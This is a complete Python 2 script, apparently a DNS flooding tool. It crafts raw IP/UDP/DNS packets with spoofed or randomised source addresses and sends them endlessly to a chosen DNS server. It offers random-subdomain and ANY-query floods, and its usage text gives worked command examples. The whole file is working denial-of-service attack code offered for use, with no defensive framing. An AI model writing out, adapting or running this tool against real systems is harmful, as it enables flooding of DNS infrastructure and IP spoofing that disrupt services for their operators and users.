#!/usr/bin/env python
import socket, sys, getopt, string
from struct import pack
from random import randint, choice
from netaddr import valid_ipv4
# import time

qTypesArray = {"A": 1,
           "ANY": 255,
           "NS": 2,
           "CNAME": 5,
           "PTR": 12,
           "MX": 15,
           "TXT": 16,
           "AAAA": 28,
           }


class attackObject(object):
    def __init__(self, destination, dnsQueryUrl="default.com", dns_query_type=1, src_ip="1.1.1.1",random_ip=0, random_q=0, random_sdq=0):
        self.destination = destination
        self.dnsQueryUrl = dnsQueryUrl
        self.dns_query_type = dns_query_type
        self.dnsHeader = self._make_dns_header(dnsQueryUrl, dns_query_type)
        self.src_ip = src_ip
        self.random_ip = random_ip
        self.random_q = random_q
        self.random_sdq = random_sdq

    def createAttack(self):
        src_port = randint(1025, 65000)
        if self.random_ip:
            self.src_ip = ".".join(map(str, (randint(0, 255)
                                    for _ in range(4))))
        if self.random_sdq:
            sub = ''.join(choice(string.lowercase) for i in range(randint(4, 9))) + "." + self.dnsQueryUrl
            self.dnsHeader = self._make_dns_header(sub, self.dns_query_type)
        if self.random_q:
            sub = ''.join(choice(string.lowercase) for i in range(randint(4, 9)))
            self.dnsHeader = self._make_dns_header(sub + ".com", self.dns_query_type)
        dnsHeaderLength = len(self.dnsHeader)
        ipHeader = self._make_ipv4_header(self.src_ip, self.destination, dnsHeaderLength)
        udpHeader = self._make_udp_header(src_port, 53, dnsHeaderLength, 0)
        placeholder = 0
        protocol = 17
        udp_length = 8 + dnsHeaderLength
        pseudoHeader = pack('!4s4sBBH', socket.inet_aton(self.src_ip), socket.inet_aton(self.destination), placeholder, protocol,
                   udp_length)

        udpHeader = self._make_udp_header(src_port, 53, dnsHeaderLength,self._checkum(pseudoHeader + udpHeader + self.dnsHeader))
        return ipHeader+udpHeader+self.dnsHeader

    @staticmethod
    def _make_dns_header(url, typeOfQuery):
        dns_header = pack(">H", randint(1025, 65000))  # Query Ids (Just 1 for now)
        dns_header += pack(">H", 256)  # Flags
        dns_header += pack(">H", 1)  # Questions
        dns_header += pack(">H", 0)  # Answers
        dns_header += pack(">H", 0)  # Authorities
        dns_header += pack(">H", 0)  # Additional
        split_url = url.split(".")
        for part in split_url:
            dns_header += pack("B", len(part))
            for byte in bytes(part):
                dns_header += pack("c", byte)
        dns_header += pack("B", 0)  # End of String
        dns_header += pack(">H", int(typeOfQuery))  # Query Type
        dns_header += pack(">H", 1)  # Query Class
        return dns_header

    @staticmethod
    def _make_udp_header(srcprt, dstprt, datal, csum):
        return pack(
            "!4H"  # Source port, Destination port, Length, Checksum
            , srcprt, dstprt, datal + 8, csum)

    @staticmethod
    def _make_ipv4_header(srcip, dstip, datal):
        srcip = socket.inet_aton(srcip)
        dstip = socket.inet_aton(dstip)
        ver = 4  # Version 4 for IPv4
        ihl = 5  # Header length in 32 bit words. 5 words == 20 bytes
        dscp_ecn = 0  # Optional fields, don't feel like implementing. Let's keep it at 0
        tlen = datal + 28  # Length of data + 20 bytes for ipv4 header + 8 bytes for udp header
        ident = socket.htons(randint(1025, 65000))  # ID of packet
        flg_frgoff = 0  # Flags and fragment offset
        ttl = randint(3,255)  # Time to live
        ptcl = 17  # Protocol, 17 (UDP)
        chksm = 0  # Will automatically fill in checksum

        return pack(
            "!"  # Network(Big endian)
            "2B"  # Version and IHL, DSCP and ECN
            "3H"  # Total Length, Identification, Flags and Fragment Offset
            "2B"  # Time to live, Protocol
            "H"  # Checksum
            "4s"  # Source ip
            "4s"  # Destination ip
            , (ver << 4) + ihl, dscp_ecn, tlen, ident, flg_frgoff, ttl, ptcl, chksm, srcip, dstip)

    @staticmethod
    def _checkum(msg):
        if len(msg) % 2 == 1:
            msg += "\0"
        s = 0
        for i in range(0, len(msg), 2):
            w = ord(msg[i + 1]) + (ord(msg[i]) << 8)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s

def usage():
    print "usage: ./dnsAttackV2 [options]"
    print " -i <$destination IP>"
    print " -d <$domain name> | , default is random"
    print " -s <$source IP> , default is random"
    print " -t <$Query type> , default is A"
    print " -r enable sub domain flood"
    print " -h display help"
    print
    print "examples:"
    print "python dnsAttackV2.py -i 10.10.10.100 -d google.com -t ANY -s 1.1.1.1 -r : Random subdomain 'ANY' Q flood with domain 'google.com' to server 10.10.10.100 with source ip 1.1.1.1"
    print "python dnsAttackV2.py -i 10.10.10.100 -d bbc.com : 'A' Q flood with domain 'bbc.com' to server 10.10.10.100 with random source ip"
    print
    print "Query types available: A, AAAA, PTR, MX, ANY, CNAME, NS, TXT"
    print


def main():
    destination = False
    domain_name = ''
    q_type = ''
    source_ip = ''
    rndm_sdq = False
    rndm_ip = False
    rndm_q = False
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'i:d:t:s:rh',
                                   ['destination_ip=', 'domain_name=', 'q_type=', 'source_ip=', 'random', 'help'])
    except getopt.GetoptError:
        print "error"
        usage()
        sys.exit(2)

    if opts == []:
        usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage()
            sys.exit(2)
        elif opt in ('-i', '--destination_ip'):
            destination = arg
        elif opt in ('-d', '--domain_name'):
            domain_name = arg
        elif opt in ('-t', '--q_type'):
            try:
                q_type = qTypesArray[arg.upper()]
            except KeyError:
                usage()
                print "Please use a valid query type"
                sys.exit(2)
        elif opt in ('-s', '--source_ip'):
            source_ip = arg
        elif opt in ('-r', '--random'):
            rndm_sdq = True
        else:
            usage()
            sys.exit(2)

    if valid_ipv4(destination) is False:
        usage()
        print "Please use a valid destination IP"
        sys.exit(2)
    else:
        if domain_name == '':
            domain_name = "default.com"
            rndm_q = True
        if q_type == '':
            q_type = 1
        if source_ip == '':
            rndm_ip = True
        elif valid_ipv4(source_ip) is False:
            usage()
            print "Please use a valid source IP"
            sys.exit(2)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            attackPackets = attackObject(destination=destination,
                                         dnsQueryUrl=domain_name,
                                         dns_query_type=q_type,
                                         src_ip=source_ip,
                                         random_ip=rndm_ip,
                                         random_q=rndm_q,
                                         random_sdq=rndm_sdq)

            print("Flooding, push 'ctrl+c' to stop")
            while True:
                s.sendto(attackPackets.createAttack(), (destination, 53))
        except KeyboardInterrupt:
            print "Bye bye"
            exit(0)

if __name__ == "__main__":
    main()
